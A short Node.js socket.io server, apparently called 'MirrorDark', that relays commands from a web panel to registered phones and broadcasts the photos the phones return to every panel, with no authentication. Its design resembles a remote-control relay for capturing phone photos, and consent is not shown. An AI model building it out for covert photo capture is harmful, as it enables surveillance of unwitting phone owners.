const express = require('express');
const http = require('http');
const { Server } = require('socket.io');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

app.use(express.static('public'));

// Listas para separar paneles web de celulares
let phones = new Map(); // socket.id -> info del celular

io.on('connection', (socket) => {
    console.log(`[+] Conexión establecida: ${socket.id}`);

    // El celular se registra indicando su rol
    socket.on('register_phone', (data) => {
        phones.set(socket.id, { id: socket.id, name: data.name || `Dispositivo ${socket.id.substring(0, 4)}` });
        console.log(`[📱] Celular registrado: ${socket.id}`);
        io.emit('update_device_list', Array.from(phones.values()));
    });

    // Si se conecta un panel web, le mandamos la lista actual de celulares
    socket.on('get_devices', () => {
        socket.emit('update_device_list', Array.from(phones.values()));
    });

    // Cuando el panel web envía un comando dirigido a un celular específico
    socket.on('command_to_phone', (data) => {
        const targetSocketId = data.targetId;
        console.log(`[>] Enviando comando (${data.action}) al celular: ${targetSocketId}`);
        
        // Se lo mandamos únicamente al celular seleccionado
        io.to(targetSocketId).emit('command_to_phone', data);
    });

    // Cuando el celular responde con la foto, se la devolvemos a todos los paneles
    socket.on('phone_response', (data) => {
        console.log(`[<] Foto recibida del celular: ${socket.id}`);
        io.emit('phone_response', data);
    });

    socket.on('disconnect', () => {
        if (phones.has(socket.id)) {
            phones.delete(socket.id);
            console.log(`[-] Celular desconectado: ${socket.id}`);
            io.emit('update_device_list', Array.from(phones.values()));
        } else {
            console.log(`[-] Panel web desconectado: ${socket.id}`);
        }
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`Servidor MirrorDark corriendo en el puerto ${PORT}`);
});